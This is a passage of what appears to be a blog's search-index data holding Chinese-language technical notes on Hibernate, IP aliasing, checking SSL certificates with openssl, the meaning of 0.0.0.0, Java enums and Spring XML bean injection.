Eclipse)\n\n```xml\n\n```\n\n## 一般實作\n\n1. 加載 Hibernate 核心文件\n\n2. New sessionfactory\n\n3. 使用SessionFactory 創建 Session 物件\n\n4. 開起交易\n\n5. CRUD\n\n6. 交易提交\n\n7. 關閉資源(Session,SessionFactory)\n\n\n## hibernate utils\n\nmain 方法建置 table\n\n## session \n\nsave\n\nupdate\n\n\ndelete\n\n\nget\n\n## hibernate 3 種狀態\n\n1. 瞬時態 物件匋有id，session 沒有關聯\n2. 持久態 物件有id、session 有關聯\n這邊沒有做save，當正常commit的話\n持久態會做資料寫入到資料庫\n**一級緩存還會提到**\n3. 托管態 物件有id，session 沒有關聯\n\n## 緩存\n\n### 一級緩存\n\n通常使用\n\n持久態 沒做 save/update，交易 commit 時候會寫入到資料庫\n\n### 二級緩存\n\n默認不使用\n\n通常現在使用 redis 代替\n\n生命週期是 SessionFactory\n\n## getCurrentSession\n\nthreadlocal\n\n\n\n### 不用 close\n\n### 不用在大量資料 test\n\n## 三種 API\n\n### Query\n\n使用 HQL\n\n介於 實體類 和 SQL 之間\n\n### Criteria\n\n使用實體類\n\n### SQLQuery\n\n原生 SQL \n\n## Entity 建立\n\n[Hibernate入门之主键生成策略详解_博客_云社区_开发者中心-华为云](https://bbs.huaweicloud.com/blogs/151905)\n[5.4. Spring Data with MySQL](http://netkiller.sourceforge.net/spring/data/spring-data-jpa.html)\n\n## 實體類關聯\n\n### 一對多\n\n通常\n\n#### 進階探討\n\n[hibernate基于注解的维护权反转：@OneToMany(mappedBy=) - bojiangzhou - 博客园](https://www.cnblogs.com/chiangchou/p/mappedby.html)\n\n#### 1. 設定 \n\n\n#### 2. 聯級\n\n### 多對多\n\n[@ManyToMany中间表附加字段设计 - rubekid - 博客园](https://www.cnblogs.com/rubekid/p/4621975.html)\n\n[Hibernate中多对多的annotation的写法（中间表可以有多个字段） - MJBrian - 博客园](https://www.cnblogs.com/mjbrian/p/6873113.html)\n\n### 一對一\n\n\n[Hibernate —— HQL与QBC的区别_tuxq5721-CSDN博客_hql和qbc](https://blog.csdn.net/u012045597/article/details/15701235)\n\n## 問題\n\n### org.hibernate.ObjectNotFoundException\n[org.hibernate.ObjectNotFoundException: No row with the given identifier exists - keepup~ - 博客园](https://www.cnblogs.com/cn-chy-com/p/8810374.html)\norg.hibernate.ObjectNotFoundException: No row with the given identifier exists\n\n### hibernate -> Spring Data JPA\n\n[Java Artisan / Neil Chan: 從 Spring + Hibernate 到 Spring Data JPA](http://cw1057.blogspot.com/2013/11/spring-hibernate-spring-data-jpa.html?m=1)\n\n[SpringBoot系列 - 集成Hibernate | 飞污熊博客](https://www.xncoding.com/2017/07/03/spring/sb-hibernate.html)\n\n[第一個hibernate程式 - 國立中山大學程式諮詢網](https://sites.google.com/a/mis.nsysu.edu.tw/cheng-shi-zi-xun-wang/java-ee-jin-jie-pian/hibernate-ji-shu/ji-chu-ru-men/jian-dan-fan-li/di-yi-gehibernate-cheng-shi)\n\n\n## junit 使用 spring 做 DAO 查詢，最外層沒辦法做 dao 查詢\n\n- [「快學springboot」在springboot中寫單元測試 - Toments 找話題](https://toments.com/2125588/)\n\n- [Spring / Hibernate / JUnit - No Hibernate Session bound to Thread - Stack Overflow](https://stackoverflow.com/questions/734614/spring-hibernate-junit-no-hibernate-session-bound-to-thread)\n\n\n## Hibernate Set / List\n\n[【学习笔记】Hibernate中多对多不用List而用Set的原因分析_机智猫-CSDN博客_多对多关系用set还是list](https://blog.csdn.net/nthack5730/article/details/45201665)\n\n\n[Hibernate的抓取策略及优化 - 簡書](https://www.jianshu.com/p/23af676b3977)\n[java - What are the differences between the different saving methods in Hibernate? - Stack Overflow](https://stackoverflow.com/questions/161224/what-are-the-differences-between-the-different-saving-methods-in-hibernate)\n\n","tags":["dao"],"categories":["Java"]},{"title":"一張網卡使用多組 IP 方法","url":"%2Fblog%2F2020%2F05%2F30%2F%E4%B8%80%E5%BC%B5%E7%B6%B2%E5%8D%A1%E4%BD%BF%E7%94%A8%E5%A4%9A%E7%B5%84-IP-%E6%96%B9%E6%B3%95%2F","content":"\n故事是這樣的，最近我們公司有多個專案，聽到都是放在獨立機器，各自一組IP。\n最近我不小心 FTP 設定錯 IP，但是上傳檔案上去。發現 http server(IP對的)竟然更新了。\n我覺得很奇怪不是不同台電腦，後來發現那一台設定很多虛擬 IP。\n~~讓我們研究公司是如何省錢的~~\n\n其實這個用途看到用一台電腦需要跨網段使用\n不需要切換 IP\n但不知道數量是不是有限制\n用台多會不會有缺點?\n\n<!--more-->\n\n這名詞叫 IP Alias \n[鳥哥的 Linux 私房菜 -- 架設 Router](http://linux.vbird.org/linux_server/0230router.php#routing_ip_alias)\n\n## window \n\n很簡單，去控制台設定，自動 dhcp 要先取消掉\n\n{% asset_img window_ip.png 設定多組 IP %}\n\n\n## linux\n\n### 簡單設定\n\n```bash\nsudo ifconfig wlp3s0:0 192.168.0.1              \n\nifconfig wlp3s:0 down\n\n# 重新匯入網路\nsudo /etc/init.d/networking restart \n# 這邊我是用下面這個才成功\nservice network-manager restart          \n```\n[鳥哥的 Linux 私房菜 -- Linux 常用網路指令介紹](http://linux.vbird.org/linux_server/0140networkcommand.php)\n\n查看狀態`ip -4 a`\n\n```\n3: wlp3s0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000\n    inet 192.168.1.117/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp3s0\n       valid_lft 76153sec preferred_lft 76153sec\n    inet 192.168.1.150/24 brd 192.168.1.255 scope global secondary wlp3s0:0\n       valid_lft forever preferred_lft forever\n```\n\n### 永久加入設定\n\n$ /etc/network/interfaces 檔案加入下列內容\n\n```\nauto lo\niface lo inet loopback\niface enp0s25 inet static\naddress 192.168.1.168\nnetmask 255.255.255.0\ngateway 192.168.1.254\n\n### 新增第二筆網卡設定\n\nauto enp0s25:0 inet static   \naddress 192.168.1.169\nnetmask 255.255.255.0\ngateway 192.168.1.254\n```\n參考:[[Ubuntu] 單網卡綁多IP - Frank Lin - Medium](https://medium.com/@frank.yylin/ubuntu-%E5%96%AE%E7%B6%B2%E5%8D%A1%E7%B6%81%E5%A4%9Aip-d69dc755efb0)\n\n然後透過 bind port 各自綁多台 IP\n這樣就能一台當多台用了\n\n[XYZ的筆記本: Linux 網卡新增多個IP](https://xyz.cinc.biz/2020/12/linux-add-secondary-ip-to-one-interface.html)\n\n### 其他 OS 設定方法\n\n[CentOS Linux 靜態 IP 位址網路設定教學 - G. T. Wang](https://blog.gtwang.org/linux/centos-linux-static-network-configuration-tutorial/)\n[Ubuntu 18.04 透過 netplan 設定網路卡 IP - Soul & Shell Blog](https://blog.toright.com/posts/6293/ubuntu-18-04-%E9%80%8F%E9%81%8E-netplan-%E8%A8%AD%E5%AE%9A%E7%B6%B2%E8%B7%AF%E5%8D%A1-ip.html)\n\n## 使用上設定防火牆陷阱\n\n最近公司AP Server 程式使用 mail 發信的時候\n明明有設定防火牆開通 IP\n結果不能發出去\n\n後來發現是 AP Server IP 是吃別的 IP\n這邊 mail server 是不同網段，所以會走 gateway\nIP Gateway 預設不是走 interface AP  這邊\n可以用 ip route show\n主要是看這一行\n\ndefault via 192.168.1.1 dev eth0 src 192.168.1.202 metric 202\n\n\n","tags":["ip"],"categories":["網路"]},{"title":"Linux 指令確認SSL憑證","url":"%2Fblog%2F2020%2F05%2F30%2FLinux-%E6%8C%87%E4%BB%A4%E7%A2%BA%E8%AA%8DSSL%E6%86%91%E8%AD%89%2F","content":"\n單純紀錄\n\n<!--more-->\n\nTODO: 有空回來整理\n\nTest FTP certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:21 -starttls ftp\n```\nTest POP3 certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:995\n```\nTest IMAP certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:993\n```\nTest SMTP SSL certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:465\n```\nTest SMTP TLS certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:587 -starttls smtp\n```\nTest HTTPS certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:443\n```\nTest DirectAdmin certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:2222\n```\n\n----\n\nHow to verify SSL certificates with SNI (Server Name Indication) using OpenSSL\n\nUsing SNI with OpenSSL is easy. Just add the -servername flag and you are good to go. Replace in the examples below mail.domain.com with the SNI name. Note: you can also use the SNI name to replace server.yourwebhoster.eu with.\n\nTest FTP certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:21 -starttls ftp -servername mail.domain.com\n```\nTest POP3 certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:995 -servername mail.domain.com\n```\nTest IMAP certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:993 -servername mail.domain.com\n```\nTest SMTP SSL certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:465 -servername mail.domain.com\n```\nTest SMTP TLS certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:587 -starttls smtp -servername mail.domain.com\n```\nTest HTTPS certificate\n```\nopenssl s_client -connect server.yourwebhoster.eu:443 -servername mail.domain.com\n```\n\n[SSL 相關的測試工具 – 軟體品管的專業思維](https://www.qa-knowhow.com/?p=3888)","categories":["Linux"]},{"title":"0.0.0.0 是什麼小知識","url":"%2Fblog%2F2020%2F05%2F30%2F0-0-0-0-%E6%98%AF%E4%BB%80%E9%BA%BC%E5%B0%8F%E7%9F%A5%E8%AD%98%2F","content":"\n我們常常使用架一些程式服務\n都會設定 host(0.0.0.0)\n通常都會認為開 port\n也知道對 ip 設定 192.168.1.111\n也有看過對 192.168.1.0 設定（會當下看網路卡 ip）\n我沒認真探討\n此篇可能有誤，歡迎指正，~~請手下留情~~\n\n<!--more-->\n\n故事是這樣的，最近我們公司有多個專案，聽到都是放在獨立機器，各自一組IP。\n最近我不小心 FTP 設定錯 IP，但是上傳檔案上去。發現 http server(IP對的)竟然更新了。\n我覺得很奇怪不是不同台電腦，後來發現那一台設定很多虛擬 IP。\n\n這之後也會寫一個文章，怎麼實做看看。\n不過...，為什麼可以在很多台開同一個 port 呢?\n\n後來發現 port 是綁在網卡上面...，一台電腦多個IP綁很多個 http (80port)\n\n## 簡單敘說 IP\n\n基本 IPv4 就不仔細說\n\n1. IP 預設常見 Class 分級\n\nClass A \nClass B\nClass C\n\n很多網頁有說，這邊不仔細講，主要預設切出來網址都是固定的。\n可參考:[IP位址分五種等級](http://kevin.hwai.edu.tw/~kevin/material/EAssistant/IP_Class.htm)\n\n2. CIDR 網域切割\n\n通常我一直搞不懂為什麼有分Class A,Class B, Class C ，然後後續討論可以自訂網路遮罩切割網域\n後來最近爬了一下，因為有了 CIDR，所以每一台電腦都可以設定網路遮罩\n可細分切出多種網路 IP\n\n詳細:[CIDR 路徑協定](http://www.tsnien.idv.tw/Internet_WebBook/chap6/6-14%20CIDR%20%E8%B7%AF%E5%BE%91%E5%8D%94%E5%AE%9A.html)\n\n## 特殊 IP\n\n### 127.0.0.1\n\n簡單就是我們常用的 localhost\n\n> 127.0.0.1屬於{127,}集合中的一個，而所有網絡號為127的地址都被稱之為迴環地址，所以迴環地址！=127.0.0.1,它們是包含關係，即迴環地址包含127.0.0.1。\n\n\n### 0.0.0.0\n\n這邊[127.0.0.1和0.0.0.0地址的区别 - 知乎](https://zhuanlan.zhihu.com/p/72988255)有爬到一些相關知識\n不過內容好像也不是很正確\n擷取一些回覆\n\n> 「0.0.0.0是本網絡中的本主機」這種老掉牙中文教科書說法就不要提了。實際上外文資料/軟件裡一般把0.0.0.0稱為「unspecified」，即未指定（即無效的，無意義的）地址。從功能上看，一般用於某些程序/網絡協議中不便使用具體ip的特殊情況（說白了就是一個用於某些比較坑的情況的「佔位符」），比如DHCP客戶端還未獲取到ip的時候規定使用0.0.0.0作「源地址」，或者服務器不指定在哪個網卡上監聽時，也使用0.0.0.0。\n\n其他也有找到[ip - What is the difference between 0.0.0.0, 127.0.0.1 and localhost? - Stack Overflow](https://stackoverflow.com/questions/20778771/what-is-the-difference-between-0-0-0-0-127-0-0-1-and-localhost/20778887#20778887)\n\n> IPV4中，0.0.0.0地址被用於表示一個無效的，未知的或者不可用的目標。\n> * 在服務器中，0.0.0.0指的是本機上的所有IPV4地址，如果一個主機有兩個IP地址，192.168.1.1 和 10.1.2.1，並且該主機上的一個服務監聽的地址是0.0.0.0,那麼通過兩個ip地址都能夠訪問該服務。\n> * 在路由中，0.0.0.0表示的是默認路由，即當路由表中沒有找到完全匹配的路由的時候所對應的路由。\n> ————————————————\n> 版权声明：本文为CSDN博主「ythunder」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n> 原文链接：https://blog.csdn.net/ythunder/java/article/details/61931080\n\n#### INADDR_ANY\n\n> NADDR_ANY介紹\n> \n> INADDR_ANY 指定地址為0.0.0.0的地址，這個地址事實上表示不確定地址或“所有地址”、“任意地址”。一般來說，在各個系統中均定義成為0值。\n>\n> INADDR_ANY 的具體含義是，綁定到0.0.0.0。此時，對所有的地址都將是有效的，如果系統考慮採用多個網卡的話，那麼使用此種bind，將在所有網卡上進行綁定。在這種情況下，你可以收到發送到所有有效地址上封包。\n參考:[【Socket】INADDR_ANY of SOCKET Programming «＊～【ＢｕｂＵｓＨａＲｅ】～＊ ＊～【ＢｕｂＵｓＨａＲｅ】～＊](https://bulifehappy.wordpress.com/2010/11/23/%E3%80%90socket%E3%80%91inaddr_any-of-socket-programming/)\n\n\n### 其他特殊IP\n\n> 2.3 特殊IP地址\n> \n> 特殊IP地址就是用來做一些特殊的事情。RFC1700中定義了以下特殊IP地址。\n> \n>     {0,0}:網絡號和主機號都全部為0，表示「本網絡上的本主機」，只能用作源地址。\n>     {0，host-id}:本網絡上的某台主機。只能用作源地址。\n>     {-1,-1}：表示網絡號和主機號的所有位上都是1（二進制），用於本網絡上的廣播，只能用作目的地址，發到該地址的數據包不能轉發到源地址所在網絡之外。\n>    {net-id,-1}:直接廣播到指定的網絡上。只能用作目的地址。\n>    {net-id,subnet-id,-1}:直接廣播到指定網絡的指定子網絡上。只用作目的地址。\n>    {net-id,-1,-1}:直接廣播到指定網絡的所有子網絡上。只能用作目的地址。\n>    {127，}:即網絡號為127的任意ip地址。都是內部主機迴環地址(loopback),永遠都不能出現在主機外部的網絡中。\n\n這編原本我看不懂`{}`裡面的意思\n後來查了一下 IP 有分{Net_id,Host_id}\n簡單來說這邊 Host_id 就把他想成能用的 IP\n0是整個填 0，**-1就是整個填1**\n\n10.x.x.x\n\n172.16。x。x∼172.31。x。x\n\n192.168。x。x\n\n私有位址，這些位址被大量用於企業內部網路中。\n\n224.0.0.1\n\n其他參考:\n[【TCP/IP】IP地址分类和特殊IP地址_网络_Yngz_Miao的博客-CSDN博客](https://blog.csdn.net/qq_38410730/article/details/80980749)\n[網路教學-IP 位址](http://www.pcnet.idv.tw/pcnet/network/network_ip_addr.htm)\n\n\n## 觀察監聽 port\n\n### windows\n\nnetstat -ano\n\n```\nC:\\Users\\Administrator>netstat -ano\n\n使用中連線\n\n  協定   本機位址               外部位址               狀態            PID\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       480\n  TCP    127.0.0.1:10400        0.0.0.0:0              LISTENING       7708\n  TCP    127.0.0.1:10401        0.0.0.0:0              LISTENING       7708\n  TCP    127.0.0.1:10402        0.0.0.0:0              LISTENING       7708\n  TCP    127.0.0.1:10403        0.0.0.0:0              LISTENING       7708\n  TCP    127.0.0.1:10403        127.0.0.1:2362         ESTABLISHED     7708\n  TCP    127.0.0.1:15292        0.0.0.0:0              LISTENING       6320\n  TCP    192.168.1.107:139      0.0.0.0:0              LISTENING       4\n```\n\n看邊主要看 LISTENING 可以看到有開那些 port\n第一個 80 port 會對所有網路卡\n\n## Linux \n\n```bash\nnetstat -pnltu\n```\n更多可看:[Linux 安裝及使用 netstat](https://www.opencli.com/linux/linux-install-use-netstat)\n\n### 設定 apache port 觀察\n\n#### 0.0.0.0 \n```conf\n# If you just change the port or add more ports here, you will likely also\n# have to change the VirtualHost statement in\n# /etc/apache2/sites-enabled/000-default.conf\n\nListen 80\n```\n\n```\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:56081           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:7070            0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:160             0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:54401           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:42979           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 0.0.0.0:51523           0.0.0.0:*               LISTEN      -                   \ntcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   \ntcp6       0      0 :::111                  :::*                    LISTEN      -                   \ntcp6       0      0 :::80                   :::*                    LISTEN      -    \n```\n\n#### 192.168.1.x\n\n```\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   \ntcp        0      0 192.168.1.117:80        0.0.0.0:*               LISTEN      -       \n```\n\n#### 192.168.1.0\n\n```\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    \ntcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -                   \ntcp        0      0 192.168.1.0:80          0.0.0.0:*               LISTEN      -     \n```\n\n這個目前沒找到相關文獻\n但是我發現 這個好像是廣播網路?\n預設會跟所有 192.168 網路卡做 bind port(尚未測試兩個相同網段IP)\n\n這邊也不是打 192.0.0.0 就可以設定\n\n## 其他有趣東西\n\n### iperf\n\n指令測試 IP 傳輸速度\n通常我們在 Linux 下面可以透過 Iometer 去測試硬碟的效能速度,那網路呢!!要以免費最簡單使用的就算是 iperf 了.\n\n[Linux command – iperf – Benjr.tw](http://benjr.tw/462)\n[Linux – iperf (Bind to host) – Benjr.tw](http://benjr.tw/19581)","tags":["port"],"categories":["網路"]},{"title":"Java 使用 Enum 小記","url":"%2Fblog%2F2020%2F05%2F28%2FJava-%E4%BD%BF%E7%94%A8-Enum-%E5%B0%8F%E8%A8%98%2F","content":"\n平常不怎麼使用 Enum \n非常地不熟悉\n今天剛好用到\n順便季錄一下\n\n<!--more-->\n\n## 簡單使用\n\n```java\npublic enum Action {\n    STOP, RIGHT, LEFT, UP, DOWN\n}\n```\n\n這邊簡單可以看到\n```java\n    public static void play(int action) {\n        switch(action) {\n            case Action.STOP:\n                System.out.println(\"播放停止動畫\");\n                break;\n            略...\n            default:\n                System.out.println(\"不支援此動作\");\n        }\n    }\n```\n\n以前~~抄抄範例~~，這邊會發現`int action`\n怎麼會跑出 `int` 出來？\n\n其實 Enum 反編譯出來，會跟原本 Enum 出來不一樣\n不知道這算不算是 Java 語法糖?\n\n```java\n    略...\n    static {\n        STOP = new Action(\"STOP\", 0);\n        RIGHT = new Action(\"RIGHT\", 1);\n        LEFT = new Action(\"LEFT\", 2);\n        UP = new Action(\"UP\", 3);\n        DOWN = new Action(\"DOWN\", 4);\n        略...\n    }\n```\n\n\n詳細內容可以看:[使用 enum 列舉常數](https://openhome.cc/Gossip/Java/Enum.html)\n\n## 自定一些內容\n\n我們公司使用不單是這樣\n可以設定出\n\n\n```java\npublic enum Car {\n    MAX_CAR(100,\"最高級車\"), NORM_CAR(5,\"中級車\"), MIN_CAR(1,\"低級車\"); \n    \n    private int price;\n    private String desc;\n    \n    private Car(int price, String desc) {\n        this.price = price;\n        this.desc = desc;\n    }\n\n    public int price() {\n        return price;\n    }\n    \n    public String desc() {\n        return desc;\n    }\n    \n    public static void main(String[] args) {\n        for(Car car : Car.values()) {\n            System.out.printf(\"Car(%s, %d, %s)%n\",\n                  car , car.price() , car.desc());\n        }\n    }\n}\n```\n\n\n這邊看到會對印到 `MAX_CAR(100,\"最高級車\"), NORM_CAR(5,\"中級車\"), MIN_CAR(1,\"低級車\"); `\n\n```java\n    private Car(int price, String desc) {\n        this.price = price;\n        this.desc = desc;\n    }\n```\n\n\n其他詳細可看:[進階 enum 運用](https://openhome.cc/Gossip/Java/EnumMore.html)\n\n\n## 取出列表資料\n\n```java\nfor(Car car: Car.values())\n    System.out.println(car.name());\n}\n```\n\n`.values()` 可以印出列表出來\n\n那有沒有find 呢?\n目前看應該只能用迴圈滾...\n\n\n\n轉成陣列方法\n> You can do (pre-Java 8):\n> ```java\n> List<Enum> enumValues = Arrays.asList(Enum.values());\n> ```\n> or\n> ```java\n> List<Enum> enumValues = new ArrayList<Enum>(EnumSet.allOf(Enum.class));\n> ```\n> Using Java 8 features, you can map each constant to its name:\n> ```java\n> List<String> enumNames = Stream.of(Enum.values())\n>                                .map(Enum::name)\n>                                .collect(Collectors.toList());\n> ```\n\n\n\n\n[Java: Check if enum contains a given string? - Stack Overflow](https://stackoverflow.com/questions/4936819/java-check-if-enum-contains-a-given-string/4936895)\n\n> This should do it:\n> ```java\n> public static boolean contains(String test) {\n> \n>     for (Choice c : Choice.values()) {\n>         if (c.name().equals(test)) {\n>             return true;\n>         }\n>     }\n> \n>     return false;\n> }\n> ```\n> This way means you do not have to worry about adding additional enum values later, they are > all checked.\n> \n> Edit: If the enum is very large you could stick the values in a HashSet:\n> ```java\n> public static HashSet<String> getEnums() {\n> \n>   HashSet<String> values = new HashSet<String>();\n> \n>   for (Choice c : Choice.values()) {\n>       values.add(c.name());\n>   }\n> \n>   return values;\n> }\n> ```\n> Then you can just do: values.contains(\"your string\") which returns true or false.\n\n\n\n其他之後有遇到再補\n\n**2020-06-18**\n\n最近做 Enum 發現測試環境跟正式環境設定的值會不一樣\n所以找一下有什麼方法可以解決這個問題\n\n[java property file as enum - Stack Overflow](https://stackoverflow.com/questions/4908973/java-property-file-as-enum)\n\n```java\npublic enum Constants {\n    PROP1,\n    PROP2;\n\n    private static final String PATH            = \"/constants.properties\";\n\n    private static final Logger logger          = LoggerFactory.getLogger(Constants.class);\n\n    private static Properties   properties;\n\n    private String          value;\n\n    private void init() {\n        if (properties == null) {\n            properties = new Properties();\n            try {\n                properties.load(Constants.class.getResourceAsStream(PATH));\n            }\n            catch (Exception e) {\n                logger.error(\"Unable to load \" + PATH + \" file from classpath.\", e);\n                System.exit(1);\n            }\n        }\n        value = (String) properties.get(this.toString());\n    }\n\n    public String getValue() {\n        if (value == null) {\n            init();\n        }\n        return value;\n    }\n\n}\n```\n","tags":["java"],"categories":["Java"]},{"title":"手動配置 XML 注入 Bean 方法","url":"%2Fblog%2F2020%2F05%2F16%2F%E6%89%8B%E5%8B%95%E9%85%8D%E7%BD%AE-XML-%E6%B3%A8%E5%85%A5-Bean-%E6%96%B9%E6%B3%95%2F","content":"\n這邊主要是講手動注入\n\n<!--more-->\n\n## 一般 Spring 注入配置文件\n\n一般通常都放在 `/resource/applicationContext.xml`\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\"\n    xsi:schemaLocation=\"http://www.springframework.org/schema/beans \n    http://www.springframework.org/schema/beans/spring-beans.xsd \n    http://www.springframework.org/schema/context \n    http://www.springframework.org/schema/context/spring-context.xsd\">\n     \n     <bean ...>\n</beans>\n```\n\n\n## 一般配置 bean\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\"\n    xsi:schemaLocation=\"http://www.springframework.org/schema/beans \n    http://www.springframework.org/schema/beans/spring-beans.xsd \n    http://www.springframework.org/schema/context \n    http://www.springframework.org/schema/context/spring-context.xsd\">\n     \n     <bean class=\"com.xxx.person.Student\" />\n</beans>\n```\n\n`context.getBean(Student.class)` 可以順利被載入\n\n## 載入是同一多個class 的 bean\n\n```xml\n<bean class=\"com.xxx.person.Student\" />\n<bean class=\"com.xxx.person.Student\" />\n```\n\n一般 `<bean class=\"com.xxx.person.Student\" />` 沒有定義 id 和 name\n所以配置出來 Bean 名稱會是 `com.xxx.person.Student#0`\n第二個就為`com.xxx.person.Student#1`\n\n**這邊跟自動注入出來名稱不一樣(JavaConfig 名稱為 xxxXxxxXxx ex:redCar )**\n\n這時候 Java 呼叫 Bean 是透過 `(Student)context.getBean(\"com.xxx.person.Student#0\");`\n這邊 getBean 使用**字串**記得要強制轉型\n不然 Java 認不出來\n\n設為 id or name 如下\n\n```xml\n<bean id=\"student1\" class=\"com.xxx.person.Student\" />\n<bean id=\"student2\" class=\"com.xxx.person.Student\" />\n```\n\n`(Student)context.getBean(\"student1\")`\n\n## 使用 JUnit\n\n這邊一樣用兩個 \n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(\"classpath:applicationContext.xml\")\n\n```java\n@RunWith(SpringJUnit4ClassRunner.class)\n@ContextConfiguration(\"classpath:applicationContext.xml\")\npublic class AppTest{\n\n    @Autowired\n    private Student student1;\n\n    @Autowired\n    private Student student2;\n}\n```\n這邊注意 student1 的對應 bean id  XML 這一行`<bean id=\"student1\" class=\"com.xxx.person.Student\" />`\n名稱要跟xml 配置一致\n\n**複習自動注入是看 class 名稱(xxxXxxx)**\n\n### id 和 name 差別\n\n```xml\n<bean name=\"student1_1 student1_2\" class=\"com.xxx.person.Student\" />\n<bean name=\"student2\" class=\"com.xxx.person.Student\" />\n```\n\n`name 可以多個命名`，如上第一行 student1_1 student1_2 可用空白、逗號、加號\nid 就不行，但也不是說不能這樣寫`<bean name=\"student1_1 student1_2\" class=\"com.xxx.person.Student\" />`\n只是這邊是指 `student1_1 student1_2` 是一個名稱\n所以這邊就沒辦法 @Autowired 方式\n\n```java\n@Autowired\nprivate Student student1_1 student1_2;\n```\n\n要這樣使用`(Student) context.getBean(\"student1_1 student1_2\");`\n\n## 建構式注入方法\n\n1. `<constructor-arg>`\n2. c-名稱空間入住(Spring 3.0 引進)\n\n### constructor-arg tag\n\n```xml\n<bean id=\"seat1\" class=\"com.xxx.Seat\">\n    <constructor-arg name=\"student\" ref=\"student1\" />\n</bean>\n```\n\n這邊的 name 是指 建構式的參數`Seat (Student student)`\n\n```Java\npublic class Seat{\n\n    private Student st;\n\n    public Seat(Student student){\n        this.st = student;\n    }\n}\n```\n\n#### 細說(可能用不到)\n\n```xml\n<!-- value 可以放值 -->\n<constructor-arg name = \"name\" value = \"tom\"></constructor-arg>\n<!-- null -->\n<constructor-arg name = \"name\">\n<null></null>\n</constructor-arg>\n<!-- -->\n<constructor-arg type=\"int\" value=\"2001\"/>\n<constructor-arg type=\"java.lang.String\" value=\"Zara\"/>\n<!-- index -->\n<constructor-arg index=\"0\" value=\"2001\"/>\n<constructor-arg index=\"1\" value=\"Zara\"/>\n\n```\n\nSpring 3 開始好像才能用建構式的參數\n[java - Spring - Attribute 'name' is not allowed to appear in element 'constructor-arg' - Stack Overflow](https://stackoverflow.com/questions/13669798/spring-attribute-name-is-not-allowed-to-appear-in-element-constructor-arg)\n在之前版本應該都是用 index 方式\n\n> （1）set注入：優點降低了耦合程度，可以按需生成set方法進行傳值；缺點：當需要注入的參數很多時，會有很多的set方法\n> （2）構造方法注入：增加了耦合程度，因為默認的無參的構造方法被覆蓋了；不能按需傳參；\n> sping官方推薦：使用set注入方法\n參考: [Spring學習筆記二：構造方法注入](https://gist.github.com/xuxiying/3193537)\n\n\n\n### C 名稱空間注入\n\n先說 c 名稱空間跟 p 名稱空間 沒關係\n\n#### 宣告方法\n\n```xml\n<beans xmlns=\"http://www.springframework.org/schema/beans\"\n    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" \n    xmlns:c=\"http://www.springframework.org/schema/c\"\n```\n\n#### 建構子注入\n\n```xml\n<bean id=\"seat1\" class=\"com.xxx.Seat\" c:st-ref=\"student1\"></bean>\n```\n\n這邊可以換成位置 c:_0-ref=\"student1\"\n但我覺得用 name 比較實用\n\n非 Bean 的值可以用\nc:_1=\"201799777799\" c:_2-ref=\"notify\"\n\n##### 使用名稱注入\n\n這邊 bean 是我邊的\n```xml\n<bean id=\"seat1\" class=\"com.xxx.Seat\" c:teacherName=\"john\"></bean>\n```\nxml 是區分大小寫的\n[XML解析忽略标签名的大小写_java_一直在路上-CSDN博客](https://blog.csdn.net/wang_yunj/article/details/43795269)\n\n\n### 建構式注入集合(collections)\n\n#### list\n\n```xml\n<!--字串-->\n<constructor-arg name = \"name\">\n    <list>\n        <value>Hello 1</value>\n        <value>Hello 2</value>\n        <value>Hello 2</value>\n    </list>\n</constructor-arg>\n\n<!-- bean -->\n<constructor-arg name = \"name\">\n    <list>\n        <ref bean=\"{Bean_id}\" />\n        <ref bean=\"{Bean_id}\" />\n        <ref bean=\"{Bean_id}\" />\n        <ref bean=\"student1\" />\n    </list>\n</constructor-arg>\n\n```\n\n#### Set\n\n```xml\n<!--字串-->\n<constructor-arg name = \"name\">\n    <set>\n        <value>Hello 1</value>\n        <value>Hello 2</value>\n        <value>Hello 2</value>\n    </set>\n</constructor-arg>\n\n<!-- bean -->\n<constructor-arg name = \"name\">\n    <set>\n        <ref bean=\"{Bean_id}\" />\n        <ref 